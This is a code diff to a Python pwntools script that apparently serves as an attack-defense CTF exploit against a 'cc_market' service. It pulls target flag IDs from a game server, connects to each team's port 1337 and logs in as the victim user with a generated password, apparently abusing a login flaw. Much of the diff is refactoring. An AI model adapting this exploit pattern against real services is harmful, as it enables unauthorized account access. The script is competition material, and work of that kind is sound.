@@ -5,18 +5,23 @@ import sys
 import json  
 import subprocess
 import requests
+import random
+import string
 
-#cheat ADOIFNOJSDAN
-#ip = "10.60.81.1"
+def generate_random_string(start=4, end=10):
+    length = random.randint(start, end)
+    letters = string.ascii_letters
+    random_string = ''.join(random.choice(letters) for _ in range(length))
+    return random_string.encode('utf-8')
+
 ip = sys.argv[1]
 response = requests.get(f"http://10.10.0.1:8081/flagIds?service=cc_market&team={ip}") 
 data = json.loads(response.text)
-us = data["cc_market"]
-us = us[ip]
-us = us  
+us = data["cc_market"][ip]
+
 CreoVendoCompro = 1
 User = 1
-username = "CookieMan"
+username = generate_random_string()
 
 def CreoVendoCompro():
     r.sendline("2")
@@ -62,23 +67,8 @@ r = remote(ip, 1337)
 r.recvuntil(">")
 if (User == 0):
     AddUser()
-"""r.sendline("2")
-r.recvuntil("Username:")
-r.sendline(username)
-r.recvuntil("Password:")
-r.sendline("Cookie")
-r.recvuntil(">")
-if (CreoVendoCompro == 0):
-    CreoVendoCompro()
-r.sendline("6")
 
-with open(file, "r") as f:
-    data = json.load(f)
-    us = data["cc_market"]
-    us = us[ip]
-    us = us
-"""
-pw = "ADOIFNOJSDAN"
+pw = generate_random_string() # Da fixxare l'hardcoding e non l'utilizzo del for :D
 r.sendline("2")
 r.recvuntil("Username:")
 r.sendline(us[-1])
